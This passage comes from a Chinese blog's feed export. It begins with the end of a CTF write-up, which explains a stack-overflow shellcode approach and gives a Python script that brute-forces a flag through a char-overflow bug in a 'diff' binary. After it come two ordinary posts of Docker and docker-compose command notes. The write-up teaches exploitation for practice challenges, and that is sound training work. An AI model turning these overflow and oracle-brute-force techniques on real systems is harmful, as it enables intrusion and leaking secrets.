class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>addr</code>长度120，<code>read</code>读了128字节，很明显的栈溢出。此外<code>buf1</code>具有可执行权限：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p &amp;buf1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = (&lt;data variable, no debug info&gt; *) 0x804a024 &lt;buf1&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x804a000 r-xp     2000 0      /xxx/diff</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 2000   /xxx/diff</span><br><span class="line">0xf7ffa000 0xf7ffd000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7ffd000 0xf7ffe000 r-xp     1000 0      [vdso]</span><br><span class="line">0xfffdc000 0xffffe000 rwxp    22000 0      [stack]</span><br></pre></td></tr></table></figure></div><blockquote><p>打开的第一个文件数据读入buf1中，打开的第二个文件数据读入addr</p></blockquote><p>因此，在第一个文件中存<code>shellcode</code>，在第二个文件中存<code>payload</code>，将返回地址覆盖为<code>buf1</code>地址，即可getshell。</p><h2 id="二进制一家亲-diff2-TaQini"><a href="#二进制一家亲-diff2-TaQini" class="headerlink" title="二进制一家亲(diff2) - TaQini"></a>二进制一家亲(diff2) - TaQini</h2><p>考察点：字符上溢出、跑脚本爆破</p><blockquote><p>题目来源：巨佬keer的diff非预期解+我两年前的汇编实验<br>代码链接：<a href="https://github.com/TaQini/AssemblyLanguage/tree/master/lab/7" target="_blank" rel="noopener">https://github.com/TaQini/AssemblyLanguage/tree/master/lab/7</a></p></blockquote><p>二进制，一家亲。</p><blockquote><p><code>diff</code>的预期解是缓冲区溢出，硬是让keer师傅找到了一处字符溢出…直接把flag给爆破出来了…tql….</p><p>于是，我把<code>diff</code>的缓冲区溢出的洞补上，将之魔改成为re题目一道。</p></blockquote><p>既然是re，就要想怎样解出flag。<code>diff</code>程序可以读<code>flag</code>和另一个文件，就叫做<code>ktql</code>好啦，并且会对这两个文件进行比较，所以思路就是变化<code>ktql</code>、爆破<code>flag</code>。</p><p>比较字符函数如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; buf2[i] + buf1[i] &amp;&amp; i &lt; <span class="number">0x400</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v0 != buf2[i] )</span><br><span class="line">      <span class="keyword">return</span> v3 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">10</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>乍一看没毛病，其实不然。for的循环条件：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf2[i] + buf1[i] &amp;&amp; i &lt; <span class="number">0x400</span>;</span><br></pre></td></tr></table></figure></div><p>一般师傅：<code>char</code> + <code>char</code> = <code>char</code> 没毛病</p><p>keer师傅：<code>char</code> + <code>char</code> = 溢出！怼他！</p><p>我们知道<code>char</code>型变量占1个字节，相当于<code>unsigned byte</code>，表示范围是0x0-0xff，那么两char相加的范围就是0x0 - 0x1fe ，可是<code>char</code>型只能存储1个字节的数据，因此两<code>char</code>相加产生的进位就会被忽略。举个栗子，0x7d+0x83=0x100-&gt;0x0。get到了这一点，再看for循环条件，就能看出些端倪了。</p><p><code>buf2[i] + buf1[i] = 0x100</code> 时会终止for循环，并且返回0。按程序正常的流程走，除非<code>buf1</code>和<code>buf2</code>完全相同，否则不可能返回0，而现在只要<code>buf1</code>和<code>buf2</code><strong>任意位置对应的字节</strong>相加等于0x100，<code>compare</code>也会返回0。</p><blockquote><p>返回 0 时程序打印 “一样”<br>返回值非0时 程序打印 行号</p></blockquote><p>根据不同的返回值，就可以对flag进行逐个字节的爆破了，脚本如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line">fix = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        payload = fix+chr(i)</span><br><span class="line">        f = open(<span class="string">'/tmp/ktql'</span>,<span class="string">'w+'</span>)</span><br><span class="line">        tmp = f.write(payload)</span><br><span class="line">        f.close()</span><br><span class="line">        p = Popen([<span class="string">'/home/ctf/diff'</span>,<span class="string">'/tmp/ktql'</span>,<span class="string">'/home/ctf/flag'</span>],stdout=PIPE)</span><br><span class="line">        res = p.stdout.read()</span><br><span class="line">        <span class="keyword">if</span> res != <span class="string">'1'</span>:</span><br><span class="line">            <span class="comment"># print res,chr(0x100-i)</span></span><br><span class="line">            <span class="keyword">print</span> fix</span><br><span class="line">            fix+=chr(<span class="number">0x100</span>-i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>上述所有题目复现地址 <a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a> or  <a href="http://ctf.taqini.space/" target="_blank" rel="noopener">http://ctf.taqini.space/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> linux </tag>
            
            <tag> one_gadget </tag>
            
            <tag> got overwrite </tag>
            
            <tag> pwn/game </tag>
            
            <tag> ssh </tag>
            
            <tag> inode </tag>
            
            <tag> 绕过 </tag>
            
            <tag> bof </tag>
            
            <tag> char溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker用法总结之常用命令</title>
      <link href="/2020/03/17/note-for-docker-3/"/>
      <url>/2020/03/17/note-for-docker-3/</url>
      
        <content type="html"><![CDATA[<p><a href="http://taqini.space/2020/03/04/note-for-docker-2">前两篇</a>介绍了<code>dockerfile</code>和<code>docker-compose.yml</code>文件。本篇将介绍相应的命令。</p><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="build"><a href="#build" class="headerlink" title="build"></a>build</h2><p>从dockerfile创建镜像</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t name</span><br></pre></td></tr></table></figure></div><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>从docker hub搜索镜像</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker search xxx</span><br></pre></td></tr></table></figure></div><h2 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h2><p>从docker hub下载镜像</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull xxx</span><br></pre></td></tr></table></figure></div><h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><p>镜像-&gt;容器; 运行容器</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p "0.0.0.0:6666:2333" -h "host" -v ./data:/data --name="name" cmd</span><br></pre></td></tr></table></figure></div><blockquote><p>-it interactive &amp; tty</p><p>-d 后台运行</p><p>-p 端口映射 本地:容器</p><p>-v 挂载数据卷 本地:容器</p><p>映射多个端口或挂载多个数据卷的话 就用多个 -p / -v </p><p>-h 容器的hostname</p><p>–name 容器name</p><p>cmd 容器执行的命令</p></blockquote><h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>容器-&gt;镜像; 打包容器为镜像</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit container_name image_name</span><br></pre></td></tr></table></figure></div><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>在容器执行命令</p><p>和run差不多，run是从镜像创建容器后执行命令，exec是对正在运行的容器执行命令</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it xxx /bin/bash</span><br></pre></td></tr></table></figure></div><blockquote><p>xxx 为容器名/ID</p><p>-it interactive &amp; tty </p></blockquote><h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs xxx</span><br></pre></td></tr></table></figure></div><blockquote><p>xxx 为容器名/ID</p></blockquote><h2 id="images"><a href="#images" class="headerlink" title="images"></a>images</h2><p>显示镜像信息</p><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>显示容器信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></div><blockquote><p>-a 全部容器，包括已经关闭的</p></blockquote><h2 id="container"><a href="#container" class="headerlink" title="container"></a>container</h2><p>容器管理命令</p><p>显示容器信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ls -a</span><br></pre></td></tr></table></figure></div><p>相当于</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></div><p>详细信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect xxx</span><br></pre></td></tr></table></figure></div><p>其他的没啥</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><p>本地与容器间复制文件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp xxx:/home/dir ./</span><br><span class="line">docker cp ./2333 xxx:/home/dir</span><br></pre></td></tr></table></figure></div><blockquote><p>和scp差不多 格式为 容器名:路径</p><p>不用加-r，默认递归复制文件夹下所有文件/文件夹</p></blockquote><blockquote><p>容器关闭后也可cp</p></blockquote><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>开启容器</p><h2 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h2><p>关掉容器</p><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>删除容器</p><h2 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h2><p>删除镜像</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>登录docker hub</p><h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>上传镜像</p><h1 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h1><p>docker-compose命令会根据compose文件中的信息对容器进行相关操作</p><p>默认的compose文件是<code>docker-compose.yml</code>，也可以通过-f 指定compose文件：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f xxx.yml</span><br></pre></td></tr></table></figure></div><blockquote><p>所以，须在docker-compose.yml文件所在的文件目录下执行docker-compose命令(如果使用默认compose文件)</p></blockquote><h2 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h2><p>根据dockerfile创建镜像，一般是更新dockerfile后使用</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure></div><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div><blockquote><p>这条命令会启动compose文件中services下定义的所有的容器</p><p>-d 选项可让服务后台运行</p><p>如果没有build过镜像，这条命令会先build镜像，然后再部署容器</p></blockquote><h2 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure></div><blockquote><p>-a 选项可显示全部进程，包括正在运行的和已经关闭的</p></blockquote><h2 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose kill</span><br></pre></td></tr></table></figure></div><blockquote><p>这条命令会终止compose文件中services下定义的所有的容器</p></blockquote><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose rm -f</span><br></pre></td></tr></table></figure></div><blockquote><p>这条命令会删除compose文件中services下定义的所有的容器</p><p>-f 选项可强制删除(无提示信息)</p></blockquote><h2 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose restart</span><br></pre></td></tr></table></figure></div><blockquote><p>这条命令会重启compose文件中services下定义的所有的容器</p></blockquote><h2 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h2><p>如果某个容器挂掉了，查看日志是必不可少的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs xxx</span><br></pre></td></tr></table></figure></div><blockquote><p>xxx 为 services中定义的服务名字</p></blockquote><p>比如</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:4</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure></div><p>查看日志的命令为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose logs webapp</span><br></pre></td></tr></table></figure></div><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec xxx [cmd]</span><br></pre></td></tr></table></figure></div><p>在xxx容器中执行命令</p><blockquote><p>命令必须是绝对路径</p></blockquote><p>e.g. 执行/bin/sh</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose exec xxx /bin/sh</span><br></pre></td></tr></table></figure></div><h2 id="run-1"><a href="#run-1" class="headerlink" title="run"></a>run</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose run [options] [-v VOLUME...] [-p PORT...] [-e KEY=VAL...] [-l KEY=VALUE...] SERVICE [COMMAND] [ARGS...]</span><br></pre></td></tr></table></figure></div><p>和docker的差不多</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> docker-compose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker用法总结之compose文件</title>
      <link href="/2020/03/04/note-for-docker-2/"/>
      <url>/2020/03/04/note-for-docker-2/</url>
      
        <content type="html"><![CDATA[<p>书接上文，<a href="http://taqini.space/2020/03/01/note-for-docker/">上一篇</a>介绍了<code>dockerfile</code>和<code>docker-compose</code>的关系，以及<code>dockerfile</code>中的常用指令。本篇将介绍docker-compose文件的写法。</p><h1 id="Compose-file"><a href="#Compose-file" class="headerlink" title="Compose file"></a>Compose file</h1><p><code>Docker-compose.yml</code>是主要用于<strong>启动docker容器</strong>的配置文件，yaml格式，简单讲就配置容器怎样启动，比如使用哪个镜像、怎样映射端口、如何挂载volume，执行什么命令等等，相当于<code>docker run</code>的参数配置文件。</p><blockquote><p>docker-compose命令根据Docker-compose.yml的内容生成镜像或管理容器(开启/停止/重启/查看/删除…)</p></blockquote><p>此外，Docker-compose还可以用来定义和运行由多个容器组成的应用。</p><blockquote><p>Define and run multi-container applications with Docker<br><a href="https://docs.docker.com/compose/" target="_blank" rel="noopener">https://docs.docker.com/compose/</a>  </p></blockquote><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"5000:5000"</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">.:/code</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">logvolume01:/var/log</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">logvolume01:</span> <span class="string">&#123;&#125;</span></span><br></pre></td></tr></table></figure></div><p>最开头的是版本号，兼容性见下表</p><table><thead><tr><th><strong>Compose file format</strong></th><th><strong>Docker Engine release</strong></th></tr></thead><tbody><tr><td>3.7</td><td>18.06.0+</td></tr><tr><td>3.6</td><td>18.02.0+</td></tr><tr><td>3.5</td><td>17.12.0+</td></tr><tr><td>3.4</td><td>17.09.0+</td></tr><tr><td>3.3</td><td>17.06.0+</td></tr><tr><td>3.2</td><td>17.04.0+</td></tr><tr><td>3.1</td><td>1.13.1+</td></tr><tr><td>3.0</td><td>1.13.0+</td></tr><tr><td>2.4</td><td>17.12.0+</td></tr><tr><td>2.3</td><td>17.06.0+</td></tr><tr><td>2.2</td><td>1.13.0+</td></tr><tr><td>2.1</td><td>1.12.0+</td></tr><tr><td>2.0</td><td>1.10.0+</td></tr><tr><td>1.0</td><td>1.9.1.+</td></tr></tbody></table><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><blockquote><p>compose文件中定义的内容包括<a href="https://docs.docker.com/compose/compose-file/#service-configuration-reference" target="_blank" rel="noopener">services</a>, <a href="https://docs.docker.com/compose/compose-file/#network-configuration-reference" target="_blank" rel="noopener">networks</a>和<a href="https://docs.docker.com/compose/compose-file/#volume-configuration-reference" target="_blank" rel="noopener">volumes</a><br>默认的compose文件为<code>./docker-compose.yml</code></p></blockquote><h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><p>容器的配置信息在services中定义。即：定义应用中包含的每个容器该如何启动</p><h4 id="image"><a href="#image" class="headerlink" title="image"></a>image</h4><p>定义容器使用的镜像</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:4</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure></div><h4 id="build"><a href="#build" class="headerlink" title="build"></a>build</h4><p>定义通过<code>docker-compose build</code>命令创建镜像时使用的Dockerfile</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./dir</span></span><br></pre></td></tr></table></figure></div><blockquote><p> 通过build来定义Dockerfile所在的目录</p></blockquote><p>也可以通过以下的详细配置，自定义Dockerfile：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" 